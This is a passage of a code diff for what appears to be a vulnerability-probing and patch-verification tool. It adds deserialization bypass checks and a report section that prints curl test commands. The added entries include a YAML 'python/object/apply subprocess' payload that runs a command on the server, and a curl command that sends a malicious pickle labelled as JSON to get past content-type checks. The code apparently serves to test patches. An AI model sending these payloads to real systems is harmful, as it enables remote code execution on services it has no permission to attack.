+            "payload":   "!!python/object/apply:subprocess.check_output [['id']]",
+            "curl":      "curl -s -X POST 'http://target/import' -H 'Content-Type: application/x-yaml' -d '!!python/object/apply:subprocess.check_output [[\"id\"]]'",
+            "verdict":   "THEORETICAL",
+            "tested":    False,
+        },
+        {
+            "name":      "JSON → Pickle Confusion",
+            "technique": "If app accepts JSON but also handles pickle, sending pickle disguised as JSON can bypass content-type check.",
+            "payload":   "Send pickle bytes with Content-Type: application/json",
+            "curl":      "curl -s -X POST 'http://target/api/load' -H 'Content-Type: application/json' --data-binary @malicious.pkl",
+            "verdict":   "THEORETICAL",
+            "tested":    False,
+        },
+    ]
 
     return {
         "ran":                True,
@@ -1106,6 +1519,8 @@ def _probe_deserialization(code_before: str, code_after: str) -> dict:
         "patched_verdict":    "PASS" if (patched_ok or vuln_gone) else "FAIL",
         "confirmed":          confirmed,
         "poc_payload":        poc,
+        "curl_commands":      curl_commands,
+        "bypass_results":     bypass_results,
         "detail": (
             f"Found {len(vuln_hits)} unsafe deserializer(s): {vuln_hits}; "
             f"patch switches to safe equivalent: {patched_ok}"
@@ -1335,22 +1750,43 @@ def render_text(report: PipelineReport) -> str:
             lines.append("    Trigger :")
             lines.append(wrap(an.trigger_conditions, indent=6))
 
-    lines += ["", sep2, "  SSRF PROBE", sep2]
+    lines += ["", sep2, f"  VULNERABILITY PROBE — {report.ssrf_probe.probe_type if report.ssrf_probe else 'N/A'}", sep2]
     if report.ssrf_probe:
         sp = report.ssrf_probe
         if sp.ran:
-            verd_icon = lambda v: "✓" if v == "PASS" else "✗"
+            def verd_icon(v):
+                return "✓" if v and "PASS" in v else ("✗" if v and ("FAIL" in v or "EXPLOIT" in v) else "?")
             lines += [
-                f"    Callback port      : {sp.callback_port}",
-                f"    SSRF confirmed     : {sp.ssrf_confirmed}",
+                f"    Probe type         : {sp.probe_type}",
                 f"    Vulnerable mode    : {verd_icon(sp.vulnerable_verdict)} {sp.vulnerable_verdict}",
-                f"      {sp.vulnerable_detail}",
+                f"      {sp.vulnerable_detail or ''}",
                 f"    Patched mode       : {verd_icon(sp.patched_verdict)} {sp.patched_verdict}",
-                f"      {sp.patched_detail}",
+                f"      {sp.patched_detail or ''}",
+                f"    PoC payload        : {sp.poc_payload}",
                 f"    Probe elapsed      : {sp.elapsed_s}s",
             ]
         else:
             lines.append(f"    Skipped — {sp.skip_reason}")
+
+        # ── CURL TEST COMMANDS ────────────────────────────────────────────────
+        if sp.curl_commands:
+            lines += ["", sep2, "  CURL TEST COMMANDS", sep2]
+            for line in sp.curl_commands:
+                lines.append(f"    {line}")
+
+        # ── BYPASS ANALYSIS ───────────────────────────────────────────────────
+        if sp.bypass_results:
+            lines += ["", sep2, "  BYPASS ANALYSIS vs PATCHED MODE", sep2]
+            for i, b in enumerate(sp.bypass_results, 1):
+                tested_tag = "(live test)" if b.get("tested") else "(theoretical)"
+                lines += [
+                    f"",
+                    f"  [{i}] {b.get('name','?')}  {tested_tag}",
+                    f"    Technique : {b.get('technique','')}",
+                    f"    Payload   : {b.get('payload', b.get('url',''))}",
+                    f"    curl      : {b.get('curl','')}",
+                    f"    Result    : {b.get('verdict','')}",
+                ]
 
     lines += ["", sep2, "  FINAL REPORT", sep2]
     lines.append(f"  Overall risk : {report.overall_risk}")
